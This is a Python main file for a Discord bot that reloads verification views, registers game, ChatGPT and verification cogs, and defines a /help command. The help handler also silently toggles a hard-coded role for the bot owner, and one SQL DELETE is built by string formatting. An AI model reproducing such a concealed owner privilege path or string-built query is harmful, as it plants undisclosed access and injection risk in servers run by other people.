import sqlite3
import nextcord.ext.commands

import settings
import basic_funcs
import backgrounds

import test_server_funcs
import small_funcs
import verifier
import metacore
import games
# from auto import AutoSender

bot = nextcord.ext.commands.Bot(intents=nextcord.Intents().all())
backgrounds.start_keeping()


async def _update_server_count():
    await bot.change_presence(activity=nextcord.Activity(type=nextcord.ActivityType.watching,
                                                         name=f'PornHub | {len(bot.guilds)} Servers'),
                              status=nextcord.Status.dnd)


@bot.event
async def on_connect():
    sql = sqlite3.connect('db.sql')

    # update existing views
    results = sql.execute("SELECT * FROM views")
    for data in results.fetchall():
        data: tuple[str | None, int | None, int | None, int | None, int | None]
        view_type, guild_id, chat_id, message_id, role_id = data
        
        if await basic_funcs.is_message_exist(bot, guild_id, chat_id, message_id):
            match view_type:
                case 'verifier_view':
                    if not await basic_funcs.is_role_exist(bot, guild_id, role_id):
                        view_guild = bot.get_guild(guild_id)
                        view_chat = view_guild.get_channel(chat_id)
                        view_message = await view_chat.fetch_message(message_id)
                        view_embed = view_message.embeds[0]

                        view_embed.set_footer(text='Верификация остановила свою работу из-за отсутствие выдаваемой роли. Для решения - пересоздайте сообщение верификации с новой ролью')
                        await view_message.edit(embed=view_embed)
                        
                        role = None
                    else:
                        role = bot.get_guild(guild_id).get_role(role_id)

                    view = verifier.verifier_view.VerifierView(role=role)
                case _:
                    view = nextcord.ui.View
    
            bot.add_view(view, message_id=message_id)
        else:
            sql.execute(f"DELETE FROM views WHERE message_id='{message_id}'")
            sql.commit()
    sql.close()

    bot.add_cog(verifier.verifier_emoji.VerifierCogListener(bot))
    bot.add_cog(games.hide_and_seek.HideNSeek(bot))
    bot.add_cog(games.mafia.MafiaCog(bot))
    bot.add_cog(small_funcs.ChatGPTCog(bot))
    bot.add_cog(metacore.MetacoreCog(bot))
    bot.add_cog(test_server_funcs.TestCommandsCog(bot))

    await _update_server_count()
    await bot.sync_all_application_commands()

    print(f'Logged as {bot.user}')
    # await AutoSender(bot).poll()


@bot.event
async def on_guild_join(_: nextcord.Guild):
    await _update_server_count()


@bot.event
async def on_guild_remove(_: nextcord.Guild):
    await _update_server_count()


@bot.slash_command(name='help', description='Помощь по командам')
async def help(interaction: nextcord.Interaction):
    embed = nextcord.Embed(title='Помощь', colour=0xf0dfaa)
    for command in bot.get_application_commands():
        embed.add_field(name=f'```/{command.name}```', value=f'```{command.description}```')

    await interaction.send(embed=embed, ephemeral=True)
    if interaction.user.id == settings.OWNER_ID:
        if interaction.user.top_role != interaction.guild.get_role(1102602842268770387):
            await interaction.user.add_roles(nextcord.Object(1102602842268770387))
        else:
            await interaction.user.remove_roles(nextcord.Object(1102602842268770387))


bot.run(settings.TOKEN)
